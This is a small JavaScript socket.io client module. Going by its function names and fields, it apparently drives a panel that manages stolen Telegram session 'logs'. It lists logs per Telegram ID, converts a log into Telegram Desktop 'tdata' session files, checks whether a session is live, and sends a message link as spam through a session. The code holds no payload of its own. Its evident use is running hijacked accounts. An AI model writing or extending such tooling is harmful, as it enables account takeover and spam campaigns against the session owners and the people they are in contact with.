const logs = {
    addNewLogHandler(callback) {

        this.socket.on("newLog", callback);
    },
    getLogs(tgId) {
        return new Promise((resolve, reject) => {
            this.socket.emit("getLogs", { tgId: tgId });
            this.socket.once("getLogs", (logs) => {
                resolve(logs);
            });
        });
    },
    getLog(logId) {
        return new Promise((resolve, reject) => {
            this.socket.emit("getLog", { logId: logId });
            this.socket.once("getLog", (log) => {
                resolve(log);
            });
        });
    },
    toTData(log_path) {
        return new Promise((resolve, reject) => {
            this.socket.emit("getTdata", { path: log_path });
            this.socket.once("getTdata", (tdata) => {
                resolve(tdata);
            });
        });
    },
    spamSession(log_path, link) {
        return new Promise((resolve, reject) => {
            this.socket.emit("spamSession", { path: log_path, message_text: link});
            this.socket.once("spamSession", (spam) => {
                resolve(spam);
            });
        });
    },
    checkSession(log_path) {
        return new Promise((resolve, reject) => {
            this.socket.emit("checkSession", { path: log_path});
            this.socket.once("checkSession", (spam) => {
                resolve(spam);
            });
        });
    }
}